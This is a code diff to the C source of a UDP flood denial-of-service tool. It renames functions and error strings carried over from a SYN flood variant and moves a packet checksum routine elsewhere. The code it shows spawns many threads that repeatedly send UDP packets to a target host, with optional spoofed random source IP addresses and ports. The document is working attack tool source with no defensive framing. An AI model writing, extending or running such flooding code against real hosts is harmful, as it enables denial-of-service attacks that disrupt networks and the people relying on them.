@@ -25,31 +25,7 @@ extern int DisplayInfo(const char *fmt, ...);
 extern int DisplayWarning(const char *fmtsring, ...);
 extern int DisplayError(const char *fmt, ...);
 
-static unsigned short CalculateSum(unsigned short *ptr, int nbytes)
-{
-    register long sum;
-    unsigned short oddbyte;
-    register short answer;
-
-    sum = 0;
-    while (nbytes > 1)
-    {
-        sum += *ptr++;
-        nbytes -= 2;
-    }
-    if (nbytes == 1)
-    {
-        oddbyte = 0;
-        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
-        sum += oddbyte;
-    }
-
-    sum = (sum >> 16) + (sum & 0xffff);
-    sum = sum + (sum >> 16);
-    answer = (short)~sum;
-
-    return (answer);
-}
+extern unsigned short CalculateSum(unsigned short *ptr, int nbytes);
 
 static int SendUDP(const pUDPStruct us, const int debug_level)
 {
@@ -172,7 +148,7 @@ static int AttackThread(const pInput input)
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "ATTACK!");
     if (!SplitURL(input->address, &split_result))
     {
-        DisplayError("SYNFloodAttack_Thread SplitURL failed");
+        DisplayError("AttackThread SplitURL failed");
         return 1;
     }
     DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->protocol);
@@ -183,53 +159,53 @@ static int AttackThread(const pInput input)
     {
         if (strlen(split_result->host) == 0)
         {
-            DisplayError("SYNFloodAttack_Thread SplitURL not right");
+            DisplayError("AttackThread SplitURL not right");
             return 1;
         }
         // make the port as default
-        split_result->port = SYN_FLOOD_PORT_DEFAULT;
+        split_result->port = UDP_FLOOD_PORT_DEFAULT;
     }
     // init the target ip and port
     udp_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
     if (!(udp_struct->dst_ip))
     {
-        DisplayError("SYNFloodAttack_Thread malloc failed: %s(%d)", strerror(errno), errno);
+        DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
     if (!memset(udp_struct->dst_ip, 0, IP_BUFFER_SIZE))
     {
-        DisplayError("SYNFloodAttack_Thread memset failed: %s(%d)", strerror(errno), errno);
+        DisplayError("AttackThread memset failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
     if (!strncpy(udp_struct->dst_ip, split_result->host, strlen(split_result->host)))
     {
-        DisplayError("SYNFloodAttack_Thread strncpy failed: %s(%d)", strerror(errno), errno);
+        DisplayError("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
     udp_struct->dst_port = split_result->port;
     FreeSplitURLBuff(split_result);
     udp_struct->loop = input->each_ip_repeat;
 
-    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "SYNFloodAttack_Thread start sending data...");
+    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "AttackThread start sending data...");
     for (;;)
     {
-        // here get the random ip address and port
         if (input->random_sip_address == ENABLE_SIP)
         {
+            // randome ip and port
             if (!GetRandomIP(&(udp_struct->src_ip)))
             {
-                DisplayError("SYNFloodAttack_Thread GetRandomIP failed");
+                DisplayError("AttackThread GetRandomIP failed");
                 return 1;
             }
             // this function has no failed
             GetRandomPort(&(udp_struct->src_port));
         }
-        // here we will use the default ip address and port
         else
         {
+            // use the static ip and port
             if (!strncpy(udp_struct->src_ip, DEFAULT_ADDRESS, strlen(DEFAULT_ADDRESS)))
             {
-                DisplayError("SYNFloodAttack_Thread copy SIP_ADDRESS failed: %s(%d)", strerror(errno), errno);
+                DisplayError("AttackThread copy SIP_ADDRESS failed: %s(%d)", strerror(errno), errno);
                 return 1;
             }
             udp_struct->src_port = (int)DEFAULT_PORT;
@@ -240,7 +216,7 @@ static int AttackThread(const pInput input)
         {
             if (SendUDP(udp_struct, input->debug_level))
             {
-                DisplayError("SYNFloodAttack_Thread Attack failed");
+                DisplayError("AttackThread Attack failed");
                 return 1;
             }
         }
@@ -261,7 +237,7 @@ int StartUDPFloodAttack(const pInput input)
     int i, j, ret;
     int status = 0;
 
-    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");
+    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartUDPFloodAttack");
 
     extern void SignalExit(int signo);
     signal(SIGINT, SignalExit);
@@ -276,13 +252,13 @@ int StartUDPFloodAttack(const pInput input)
                 //input->serial_num = (i * input->max_thread) + j;
                 if (pthread_attr_init(&attr))
                 {
-                    DisplayError("StartSYNFlood pthread_attr_init failed");
+                    DisplayError("StartUDPFloodAttack pthread_attr_init failed");
                     return 1;
                 }
                 //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
                 if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
                 {
-                    DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
+                    DisplayError("StartUDPFloodAttack pthread_attr_setdetachstate failed");
                     return 1;
                 }
                 // create thread
@@ -320,13 +296,13 @@ int StartUDPFloodAttack(const pInput input)
                         //input->serial_num = (i * input->max_thread) + j;
                         if (pthread_attr_init(&attr))
                         {
-                            DisplayError("StartSYNFlood pthread_attr_init failed");
+                            DisplayError("StartUDPFloodAttack pthread_attr_init failed");
                             return 1;
                         }
                         //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
                         if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
                         {
-                            DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
+                            DisplayError("StartUDPFloodAttack pthread_attr_setdetachstate failed");
                             return 1;
                         }
                         // create thread
